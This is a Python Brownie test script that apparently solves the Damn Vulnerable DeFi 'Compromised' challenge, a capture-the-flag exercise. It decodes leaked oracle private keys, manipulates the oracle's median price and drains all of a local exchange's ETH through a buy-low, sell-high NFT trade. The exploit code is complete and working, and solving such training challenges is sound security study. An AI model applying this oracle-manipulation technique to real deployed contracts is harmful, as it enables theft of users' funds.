from brownie import (
    accounts,
    DamnValuableNFT,
    Exchange,
    TrustfulOracle,
    TrustfulOracleInitializer,
)
from web3 import Web3

EXCHANGE_INITIAL_ETH_BALANCE = Web3.toWei("10000", "ether")
INITIAL_NFT_PRICE = Web3.toWei("999", "ether")
FIVE_ETH = Web3.toWei("5", "ether")

sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
]


def before():
    # setup scenario
    deployer = accounts[0]
    attacker = accounts[1]

    # fund the trusted source addresses
    deployer.transfer(sources[0], FIVE_ETH)
    deployer.transfer(sources[1], FIVE_ETH)
    deployer.transfer(sources[2], FIVE_ETH)

    # deploy the oracle and setup the trusted sources with initial prices
    oracle_address = TrustfulOracleInitializer.deploy(
        sources,
        ["DVNFT", "DVNFT", "DVNFT"],
        [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
        {"from": deployer},
    ).oracle()
    oracle = TrustfulOracle.at(oracle_address)

    # deploy the exchange and get the associated ERC721 token
    exchange = Exchange.deploy(
        oracle.address, {"from": deployer, "value": EXCHANGE_INITIAL_ETH_BALANCE}
    )
    token = DamnValuableNFT.at(exchange.token())

    global initial_attacker_balance
    initial_attacker_balance = attacker.balance()

def run_exploit():
    # remove pass and add exploit code here
    # attacker = accounts[1] - account to be used for exploit
    deployer = accounts[0]
    attacker = accounts[1]
    exchange = Exchange[0]
    token = DamnValuableNFT[0]
    oracle = TrustfulOracle[0]
    
    # DECODING of the Private Keys
    # key1 encoded: 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 
    # key2 encoded: 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
    # first we convert from Hex to Text on https://www.online-toolz.com/tools/decode-hex.php >> we obtain a Base64 text
    # key1 Base64: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
    # key2 Base64: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
    # then we convert from Base64 to Text on https://www.online-toolz.com/tools/base64-decode-encode-online.php
    # key1 decoded: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
    # key2 decoded: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

    # generate the accounts from the private keys
    source1 = accounts.add('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9')
    source2 = accounts.add('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48')

    # put price to 0 to buy the DVNFT at very low price
    oracle.postPrice('DVNFT', 0, {'from': source1})
    oracle.postPrice('DVNFT', 0, {'from': source2})

    # confirm new median price is 0
    assert oracle.getMedianPrice('DVNFT') == 0

    # buy the DVNFT at 0 price. We send a very small amount of ETH to pass the test
    tx = exchange.buyOne({'from':attacker, 'value':1})
    tokenId = tx.return_value

    # confirm 1 DVNFT was bought by the attacker for 1 wei
    assert token.balanceOf(attacker) == 1

    # put price to EXCHANGE_INITIAL_ETH_BALANCE to sell the DVNFT at the maximum possible price (all ETH in the exchange)
    oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE, {'from': source1})
    oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE, {'from': source2})
    
    # confirm new median price is EXCHANGE_INITIAL_ETH_BALANCE
    assert oracle.getMedianPrice('DVNFT') == EXCHANGE_INITIAL_ETH_BALANCE

    # approve the token so the exchange can receive it
    token.approve(exchange.address, tokenId, {'from': attacker})

    # sell the token to the exchange
    exchange.sellOne(tokenId, {'from': attacker})

def after():
    # Confirm exchange lost all ETH
    assert Exchange[-1].balance() == 0


def test_compromised_challenge():
    before()
    run_exploit()
    after()
